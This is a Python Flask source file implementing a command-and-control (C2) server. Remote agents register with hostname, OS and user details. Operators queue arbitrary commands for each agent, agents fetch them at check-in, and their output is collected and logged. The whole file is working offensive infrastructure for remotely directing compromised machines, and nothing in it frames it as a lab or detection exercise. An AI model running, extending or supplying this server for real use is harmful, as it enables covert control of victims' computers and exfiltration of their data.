from flask import Flask, request, jsonify
from flask_cors import CORS
from rich.console import Console
import json
import os
import datetime
import threading

console = Console()
app = Flask(__name__)
CORS(app)

# Store connected agents
agents = {}
command_queue = {}
results_store = {}

def log(msg, level="info"):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    colors = {"info": "cyan", "success": "green", "warning": "yellow", "danger": "red"}
    color = colors.get(level, "white")
    console.print(f"[{color}][{timestamp}] {msg}[/{color}]")


@app.route('/register', methods=['POST'])
def register_agent():
    """Agent calls this to register itself with C2"""
    data = request.json
    agent_id = data.get('agent_id')
    
    agents[agent_id] = {
        'ip': request.remote_addr,
        'hostname': data.get('hostname'),
        'os': data.get('os'),
        'user': data.get('user'),
        'last_seen': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'status': 'active'
    }
    command_queue[agent_id] = []
    
    log(f"[+] New agent registered! ID={agent_id} Host={data.get('hostname')} User={data.get('user')}", "success")
    return jsonify({"status": "registered", "agent_id": agent_id})


@app.route('/checkin/<agent_id>', methods=['GET'])
def checkin(agent_id):
    """Agent checks in for commands"""
    if agent_id in agents:
        agents[agent_id]['last_seen'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Give agent its next command if any
        if command_queue.get(agent_id):
            cmd = command_queue[agent_id].pop(0)
            log(f"[*] Sending command to {agent_id}: {cmd['command']}", "warning")
            return jsonify({"command": cmd['command'], "cmd_id": cmd['cmd_id']})
    
    return jsonify({"command": "sleep", "cmd_id": "0"})


@app.route('/result', methods=['POST'])
def receive_result():
    """Agent sends back command results"""
    data = request.json
    agent_id = data.get('agent_id')
    cmd_id = data.get('cmd_id')
    output = data.get('output')
    
    if agent_id not in results_store:
        results_store[agent_id] = []
    
    results_store[agent_id].append({
        'cmd_id': cmd_id,
        'output': output,
        'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    
    log(f"[+] Result from {agent_id}:\n{output}", "success")
    return jsonify({"status": "received"})


@app.route('/agents', methods=['GET'])
def list_agents():
    """List all connected agents"""
    return jsonify(agents)


@app.route('/cmd', methods=['POST'])
def queue_command():
    """Queue a command for an agent"""
    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command')
    cmd_id = str(datetime.datetime.now().timestamp())
    
    if agent_id in command_queue:
        command_queue[agent_id].append({
            'command': command,
            'cmd_id': cmd_id
        })
        log(f"[*] Command queued for {agent_id}: {command}", "warning")
        return jsonify({"status": "queued", "cmd_id": cmd_id})
    
    return jsonify({"status": "agent not found"}), 404


@app.route('/results/<agent_id>', methods=['GET'])
def get_results(agent_id):
    """Get results from an agent"""
    return jsonify(results_store.get(agent_id, []))


def run_server(host="0.0.0.0", port=8080):
    """Start the C2 server"""
    console.print(f"\n[bold red]========================[/bold red]")
    console.print(f"[bold red]   C2 SERVER STARTING   [/bold red]")
    console.print(f"[bold red]========================[/bold red]")
    console.print(f"[green][+] Listening on {host}:{port}[/green]")
    console.print(f"[cyan][*] Waiting for agents...[/cyan]\n")
    app.run(host=host, port=port, debug=False)


if __name__ == "__main__":
    run_server()
